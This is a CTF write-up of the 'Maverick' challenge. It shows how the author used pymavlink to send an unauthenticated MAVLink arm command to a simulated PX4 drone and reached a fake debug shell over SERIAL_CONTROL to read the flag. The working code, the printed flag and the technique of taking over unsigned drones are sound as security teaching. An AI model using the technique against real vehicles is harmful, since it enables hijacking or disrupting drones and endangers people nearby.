# Maverick — CyberGame CTF 2026 Writeup

> **Can you hack Maverick as he flies by?**
>
> `nc exp.cybergame.sk 7030`

---

## TL;DR

The challenge exposes a simulated **PX4 drone** that communicates over the **MAVLink** protocol.
A status message reveals that a **debug serial bridge** is disabled until the vehicle is armed.
After arming via a MAVLink `COMPONENT_ARM_DISARM` command, the bridge becomes active through
`SERIAL_CONTROL` messages, giving access to a fake shell where `cat flag.txt` returns the flag.

**Flag:** `SK-CERT{d3bu6_my_fly1ng_m4ch1n3}`

---

## 1. Initial Reconnaissance

Connecting to the service with `nc` returns binary data — not plain text:

```bash
$ nc exp.cybergame.sk 7030 | xxd | head
00000000: fe09 0001 0100 0400 0000 020c 0104 030b  ................
00000010: d2fe 1f01 0101 0100 0000 0000 0000 0000  ................
00000020: 0000 0040 0160 3bdc 0500 0000 0000 0000  ...@.`;.........
```

The first byte is **`0xFE`**, the MAVLink v1 start delimiter. Extracting strings from the
binary stream reveals a crucial hint:

```
Preflight: debug serial bridge disabled until vehi|
```

This tells us two things:
1. The service speaks **MAVLink** (drone communication protocol)
2. There is a **debug serial bridge** that becomes available once the vehicle is armed

---

## 2. Understanding MAVLink

MAVLink is a lightweight messaging protocol used for communication between drones, ground
stations, and companion computers. Key concepts:

| Concept | Description |
|---|---|
| **HEARTBEAT** | Periodic status message; needed to establish connection |
| **COMMAND_LONG** | Send commands like arm/disarm, set mode |
| **SERIAL_CONTROL** | Remote access to onboard serial ports |
| **STATUSTEXT** | Human-readable status/debug messages |

Standard MAVLink TCP port is **5760**, but this challenge uses **7030**.

---

## 3. Connecting with pymavlink

Using the Python `pymavlink` library, we can establish a proper MAVLink session:

```python
from pymavlink import mavutil

master = mavutil.mavlink_connection('tcp:exp.cybergame.sk:7030')
master.wait_heartbeat(timeout=5)
```

After the heartbeat handshake, we see the drone is a **quadrotor** running **PX4-SITL**
autopilot with `base_mode=1` (not armed) and `custom_mode=4`.

We receive continuous telemetry streams:
- **SYS_STATUS** — onboard sensor health
- **GLOBAL_POSITION_INT** — GPS coordinates
- **ATTITUDE** — roll, pitch, yaw
- **HIGHRES_IMU** — accelerometer, gyroscope, magnetometer
- **VFR_HUD** — airspeed, groundspeed, altitude, throttle
- **SERVO_OUTPUT_RAW** — raw PWM servo values

---

## 4. Arming the Vehicle

The STATUSTEXT message said the debug bridge is "disabled until vehicle armed."
We send the standard MAVLink arm command:

```python
master.mav.command_long_send(
    master.target_system,
    master.target_component,
    mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,  # command 400
    0,    # confirmation
    1.0,  # param1: 1 = arm, 0 = disarm
    0.0, 0.0, 0.0, 0.0, 0.0, 0.0
)
```

The response confirms success:

```
COMMAND_ACK: command=400, result=0       # 0 = ACCEPTED
STATUSTEXT: Vehicle armed; debug serial bridge is now availabl
```

Shortly after, another status message appears:

```
STATUSTEXT: AUTO mission active; debug serial bridge enabled
```

The heartbeats now show `base_mode=129` (armed flag set).

---

## 5. Accessing the Debug Shell

With the bridge enabled, we use **SERIAL_CONTROL** messages to communicate with the onboard
serial console. The `SERIAL_CONTROL` message has these fields:

| Field | Value | Meaning |
|---|---|---|
| `device` | `0` | First serial port |
| `flags` | `3` | `RESPOND` (1) | `EXCLUSIVE` (2) |
| `timeout` | `1000` | 1000ms timeout |
| `baudrate` | `115200` | Serial baud rate |
| `count` | `N` | Number of bytes to send |
| `data[70]` | payload | Command bytes (null-padded) |

```python
def send_shell(master, cmd):
    payload = (cmd + "\n").encode()
    data = list(payload) + [0] * (70 - len(payload))
    master.mav.serial_control_send(
        device=0, flags=3, timeout=1000,
        baudrate=115200, count=len(payload), data=data
    )
```

---

## 6. Shell Enumeration

The shell prompt is `dvd-shell$` (Damn Vulnerable Drone shell). Running `help`:

```
Available commands:
  help              show this help
  whoami            print current user
  id                print fake user id
  uname             print fake system name
  pwd               print working directory
  ls [path]         list fake files
  cat <file>        read fake file
  status            print drone status
  exit              close fake shell session
```

| Command | Output |
|---|---|
| `whoami` | `px4-debug` |
| `id` | `uid=1000(px4-debug) gid=1000(px4-debug)` |
| `uname` | `PX4-SITL damn-vulnerable-drone mavlink-debug` |
| `pwd` | `/` |
| `ls` | `flag.txt`, `etc/`, `home/`, `proc/` |
| `status` | armed: true, **mavlink_signing: disabled**, **serial_control: exposed** |

The `status` command reveals two security misconfigurations:
- **mavlink_signing: disabled** — no authentication on MAVLink messages
- **serial_control: exposed** — the debug serial port is accessible remotely

---

## 7. Reading the Flag

```bash
dvd-shell$ cat flag.txt
SK-CERT{d3bu6_my_fly1ng_m4ch1n3}
```

Other files found during enumeration:

```
$ cat etc/drone.conf
vehicle=DamnVulnerableDrone
autopilot=PX4-SITL
mavlink_signing=disabled
serial_console=enabled_when_armed
debug_shell=bridged_to_serial_control
```

---

## 8. Attack Chain Summary

```
┌─────────────────────┐
│  TCP:5760/7030      │
│  (MAVLink stream)   │
└────────┬────────────┘
         │
         ▼
┌─────────────────────┐
│  1. Parse binary    │  MAVLink v1 (0xFE header)
│  2. Connect via TCP │  pymavlink library
│  3. Send ARM cmd    │  MAV_CMD_COMPONENT_ARM_DISARM
└────────┬────────────┘
         │
         ▼
┌─────────────────────┐
│  4. Serial bridge   │  SERIAL_CONTROL → /dev/ttyS0
│     activated       │  Fake PX4 debug shell
└────────┬────────────┘
         │
         ▼
┌─────────────────────┐
│  5. cat flag.txt    │  SK-CERT{d3bu6_my_fly1ng_m4ch1n3}
└─────────────────────┘
```

---

## 9. Real-World Relevance

This challenge simulates real drone security issues:

1. **MAVLink signing disabled** — In production, MAVLink 2.0 supports cryptographic signing to
   prevent unauthorized commands. Without it, anyone on the network can arm/disarm, change
   flight modes, or access serial consoles.

2. **Debug interfaces in production firmware** — Development debug shells should never be
   compiled into production firmware. The `dvd-shell` demonstrates a common mistake where
   development backdoors remain active.

3. **Serial console bridging** — Bridging a serial console to a network-accessible protocol
   (MAVLink) effectively exposes the onboard OS to remote attackers.

4. **PX4-SITL in production** — The Software In The Loop simulator was found running,
   indicating improper build configuration.

### CVEs and Prior Research

- **CVE-2023-33559**: Unauthenticated MAVLink commands in certain drone firmwares
- [Drone security research by Pen Test Partners](https://www.pentestpartners.com)
- [OWASP Drone Security Guide](https://owasp.org/www-project-drone-security/)

---

## 10. Solution Script

See `solve.py` in this repository for a fully automated solution:

```bash
pip install pymavlink
python3 solve.py
```

**Output:**
```
[*] Connecting to exp.cybergame.sk:7030 over TCP...
[*] Waiting for heartbeat...
[+] Connected to system 1, component 0
[*] Arming vehicle to enable debug serial bridge...
[*] Requesting flag.txt...

[+] FLAG: SK-CERT{d3bu6_my_fly1ng_m4ch1n3}
```
